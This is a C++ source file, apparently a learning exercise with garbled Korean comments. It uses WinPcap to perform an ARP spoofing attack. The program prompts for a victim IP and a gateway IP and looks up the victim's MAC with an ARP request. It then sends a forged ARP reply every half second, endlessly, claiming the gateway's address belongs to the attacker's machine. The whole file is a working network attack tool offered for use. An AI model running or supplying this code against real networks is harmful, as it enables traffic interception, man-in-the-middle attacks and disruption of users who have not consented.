#pragma comment(lib, "ws2_32.lib")

#include <iostream>
#include <pcap.h>
#include <limits.h>
#include <tchar.h>
#include <string.h>
#include <ctype.h>
#include "getmymacip.h"

//Ethernet Name
//{6EF37E61-C314-41AB-BCCC-F1D5F1C3EAFA}

#define MAC_LEN 6
#define IPV4_LEN 4
#define ETHERTYPE 0x0001
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806
#define ARP_LEN 42

//target��, ������ ���̺��� �����ϰ��� �ϴ� ����. (����Ʈ����ip, ��mac)
uint8_t target_mac[MAC_LEN] = {};// 0xcc, 0x2f, 0x71, 0x59, 0x64, 0x74 };		//attacker's mac address
uint8_t target_ip[IPV4_LEN] = {};// 192, 168, 43, 1 };//{ 192, 168, 43, 97 };	//gateway ip address
uint8_t destination_mac[MAC_LEN] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };		//victim mac, ��� ���� ���ؾߵ�
uint8_t destination_ip[IPV4_LEN] = { 0, 0, 0, 0 };								//victim ip

using namespace std;

typedef struct ethernet_header {
	unsigned char dest[MAC_LEN];
	unsigned char sour[MAC_LEN];
	unsigned short type;	//2byte
}ETHER_HDR;
typedef struct arp_header {
	unsigned short type;
	unsigned short protocol_type;
	unsigned char hrdAddr;	//hardware address
	unsigned char prtAddr;	//protocol address
	unsigned short opcode;	//1 request, 2 reply, 3 RARP request, 4 RARP reply
	unsigned char send_mac[MAC_LEN];
	unsigned char send_ip[IPV4_LEN];
	unsigned char recv_mac[MAC_LEN];
	unsigned char recv_ip[IPV4_LEN];
}ARP_HDR;
typedef struct ipv4_header {
	unsigned char ip_header_len : 4;	//4bit
	unsigned char ip_ver:4;				//4bit
	unsigned char ip_tos;	//type of service
	unsigned short ip_total_length;	//total ip length, no ethernet header
	unsigned short ip_pid;	//packet id

	unsigned char ip_frag_offset;	//fragmented�� ��Ŷ�� ���, �̰� �� ��°����?
	unsigned char ip_ttl;	//time to live
	unsigned char ip_protocol;	//ip protocol
	//TCP 0x06, UDP 0x11
	unsigned short ip_checksum;
	unsigned int ip_srcaddr;
	unsigned int ip_destaddr;
}IPV4_HDR;

void ipParser(char* ip, uint8_t* destination_ip) {
	char* ptr = ip;
	for (int i = 0; *ptr; i++) {
		if (*ptr < '0' || *ptr > '9')
			ptr++;
		destination_ip[i] = (unsigned char)strtol(ptr, &ptr, 10);
	}		
}
void macParser(char* mac, uint8_t* destination_mac) {
	char* ptr = mac;
	for (int i = 0; i < 20; i++)				//changing capital alpha into small alpha
		mac[i] = tolower(mac[i]);

	for (int i = 0; *ptr; i++) {
		if (!isdigit(*ptr) && !islower(*ptr))	//alien character, when not a small alphabet
			ptr++;
		destination_mac[i] = (unsigned char)strtol(ptr, &ptr, 16);
	}
}
void printPacket(unsigned char* packet, int packet_size) {
	for (int i = 0; i < packet_size; i++) {
	if (!(i % 16))
	printf("\n");
	printf("%02x ", packet[i]);
	}
}

int _tmain(int argc, _TCHAR* argv[]) {
	pcap_if_t* alldevs;
	//findalldevs ���� https://www.winpcap.org/docs/docs_412/html/structpcap__if.html
	int inum;	int i = 0;
	pcap_t* fp;
	char errbuf[PCAP_ERRBUF_SIZE];
	unsigned char packet[1500];	//maximum size if 1500
	if (pcap_findalldevs(&alldevs, errbuf) == -1) {
		fprintf(stderr, "Error to find devices: %s\n", errbuf);
		exit(1);
	}

	//pcap_t ����ü ���� https://blog.silnex.kr/libpcapstruct-pcap_t/
	for (pcap_if_t* dev = alldevs; dev; dev = dev->next) {
		printf("%d. %s", ++i, dev->name);
		if (dev->description)
			printf(" (%s)\n", dev->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0) {
		printf("\nNo interfaces found\n");
		return -1;
	}

	printf("Enter the interface number(1-%d): ", i);
	scanf("%d", &inum);

	if (inum<1 || inum>i) {
		printf("\nInvalid number\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	i = 0;
	pcap_if_t* dev = alldevs;
	for ( ; i < inum - 1; dev = dev->next, i++);
	//list ��ȸ�Ͽ� ���õ� interface�� �Ѿ.

	//pcap_open_live, fp ���� https://wiki.kldp.org/KoreanDoc/html/Libpcap-KLDP/function.html
	fp = pcap_open_live(dev->name, USHRT_MAX + 1, 0, 1000, errbuf);
	//device name, capturing size, promiscuous mode, read timeout, error buffer
	if (!fp) {
		fprintf(stderr, "\nCannot open the adapter.\n%s is not supported by WinPcap\n", argv[1]);
		return -1;
	}
	
	memset(packet, 0, sizeof(packet));
	ETHER_HDR eth;
	ARP_HDR arp;
	int packet_idx = 0;
	char mac[30];
	char ip[30];
	
	//set destination ip
	printf("Input the victim ip address in this form (192.168.43.97): ");
	scanf("%20s", ip);
	fflush(stdin);
	ipParser(ip, destination_ip);

	//set source ip
	printf("Input the target ip(gateway) address in this form (192.168.43.1): ");
	scanf("%20s", ip);
	fflush(stdin);
	ipParser(ip, target_ip);

	//set source mac
	macParser(getMyMac("{6EF37E61-C314-41AB-BCCC-F1D5F1C3EAFA}"), target_mac);//�� ip ���� ���ϱ�

	//get destination mac
		{
			for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
				eth.sour[i] = target_mac[i];
				eth.dest[i] = 0xff;
				arp.send_mac[i] = target_mac[i];	//target mac�� gateway��ô pretending�ϴ� mac�ּҷ�, attacker�� mac�̴�.
				arp.recv_mac[i] = 0x00;
			}
			eth.type = htons(ETHERTYPE_ARP);

			memcpy(packet, &eth, sizeof(eth));
			packet_idx += sizeof(eth);

			arp.type = htons(ETHERTYPE);			//ethernet type
			arp.protocol_type = htons(ETHERTYPE_IP);
			arp.hrdAddr = MAC_LEN;					//hardware size. ���⼭ hardware�� mac�ּҸ� ����.
			arp.prtAddr = IPV4_LEN;					//protocol size. ���⼭ ipv4���������� ����, �翬�� �ּҴ� ip�̴�.
			arp.opcode = htons(0x0001);	//request
			for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
				arp.send_ip[i] = target_ip[i];		//actual my ip, ����ᵵ �ȴٴ���
				arp.recv_ip[i] = destination_ip[i];	//victim ip
			}

			memcpy(packet + packet_idx, &arp, sizeof(arp));
			packet_idx += sizeof(arp);
			printPacket(packet, packet_idx);
			if (pcap_sendpacket(fp, packet, ARP_LEN)) {
				fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
				return -1;
			}
		}

//----------------------------------------------------------------------------------------------------------------
	memset(&eth, 0, sizeof(eth));
	memset(&arp, 0, sizeof(arp));
	memset(&packet, 0, sizeof(packet));
	packet_idx = 0;

//-----------------------------------------------------------------------------------------------------------------
	//OPEN packet and get mac
	//u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h);
	struct pcap_pkthdr h;
	const u_char* temp = pcap_next(fp, &h);
	int count = 1000;
	while (temp) {
		if (count-- < 0) {
			printf("ARP return isn't captured\n\n");
			exit(-1);
		}
		if (temp[12] == 0x08 && temp[13] == 0x06) {											//ARP��Ŷ���� Ȯ��
			if (!strncmp((const char*)destination_ip, (const char*)temp + 28, IPV4_LEN)) {	//28 ~ 31�� victim ip�� ������ Ȯ��
				//printPacket((unsigned char*)temp, ARP_LEN);								//22 ~ 27 mac ����
				strncpy((char*)destination_mac, (char*)temp + 22, MAC_LEN);
				printf("\n\n");
				break;
			}
		}
		temp = pcap_next(fp, &h);
	}
		
//-----------------------------------------------------------------------------------------------------------------

	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
		eth.sour[i] = target_mac[i];
		arp.send_mac[i] = target_mac[i];
		eth.dest[i] = destination_mac[i];
		arp.recv_mac[i] = destination_mac[i];
	}
	eth.type = htons(ETHERTYPE_ARP);

	memcpy(packet, &eth, sizeof(eth));
	packet_idx += sizeof(eth);

	arp.type = htons(ETHERTYPE);			//ethernet type
	arp.protocol_type = htons(ETHERTYPE_IP);
	arp.hrdAddr = MAC_LEN;					//hardware size. ���⼭ hardware�� mac�ּҸ� ����.
	arp.prtAddr = IPV4_LEN;					//protocol size. ���⼭ ipv4���������� ����, �翬�� �ּҴ� ip�̴�.
	arp.opcode = htons(0x0002);	//attack, reply
	for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
		arp.send_ip[i] = target_ip[i];		//arp���� source ip�� pretending ip(gateway)�̴�.
		arp.recv_ip[i] = destination_ip[i];	//victim ip
	}

	memcpy(packet + packet_idx, &arp, sizeof(arp));
	packet_idx += sizeof(arp);
	while (true) {
		if (pcap_sendpacket(fp, packet, ARP_LEN)) {
			fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
			return -1;
		}
		Sleep(500);//0.5s
	}
	

}